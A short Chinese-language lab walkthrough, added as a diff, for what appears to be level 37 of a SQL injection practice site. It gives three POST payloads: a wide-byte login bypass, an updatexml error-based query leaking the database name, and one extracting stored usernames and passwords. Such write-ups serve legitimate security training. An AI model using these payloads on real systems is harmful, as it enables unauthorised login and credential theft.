@@ -1,0 +1,18 @@
+第37关
+
+post类型宽字节
+
+用户名这里可以注入
+
+利用万能密码和宽字节注入方式登录成功
+uname=1111%a0' or 1=1 #&passwd=1111&submit=Submit
+
+updatexml报错注入
+uname=1111%a0' or updatexml(1,concat(0x7e,database(),0x7e),1) #&passwd=1111&submit=Submit
+
+爆信息
+uname=1111%a0' or updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1) #&passwd=1111&submit=Submit
+
+
+
+闯关成功！！！
